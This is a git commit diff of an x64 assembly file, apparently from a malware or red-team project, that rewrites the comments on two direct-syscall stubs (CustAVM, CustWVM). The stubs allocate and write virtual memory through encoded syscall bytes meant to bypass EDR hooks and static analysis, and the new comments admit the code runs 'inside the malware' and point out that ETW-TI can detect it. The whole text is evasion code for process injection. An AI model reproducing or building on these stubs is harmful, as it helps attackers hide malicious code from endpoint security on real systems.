936bced3523abc8da7a0f19519810061b0f770ba
Neyrian <58340493+Neyrian@users.noreply.github.com>
2026-06-17 11:23:03 +0200

    Add comments ASM

--- syscalls.asm
+++ syscalls.asm
@@ -4,12 +4,12 @@ global CustWVM
 
 CustAVM:
     mov r10, rcx
-    mov rax, 0x18 ; Load the value of smID into RAX
-    db 0x0F, 0x05   ; Encoded `syscall` instruction to prevent hooking
-    ret
+    mov rax, 0x18   ; Load the value of smID into RAX
+    db 0x0F, 0x05   ; Encoded `syscall` instruction to trick a poorly written static analyzer
+    ret             ; Return to caller. Note that Event Tracing for Windows Threat Intelligence (ETW-TI) will detect that the RIP will point directly to a memory address inside the malware and not the traditionnal ntdll. Oupsy
 
 CustWVM:
-    mov r10, rcx          ; Move ProcessHandle to R10
-    mov rax, 0x3A ; Load the value of smID into RAX
-    db 0x0F, 0x05   ; Encoded `syscall` instruction to prevent hooking
-    ret                   ; Return to caller
+    mov r10, rcx    ; Move ProcessHandle to R10
+    mov rax, 0x3A   ; Load the value of smID into RAX
+    db 0x0F, 0x05   ; Encoded `syscall` instruction to trick a poorly written static analyzer
+    ret             ; Return to caller. Note that Event Tracing for Windows Threat Intelligence (ETW-TI) will detect that the RIP will point directly to a memory address inside the malware and not the traditionnal ntdll. Oupsy
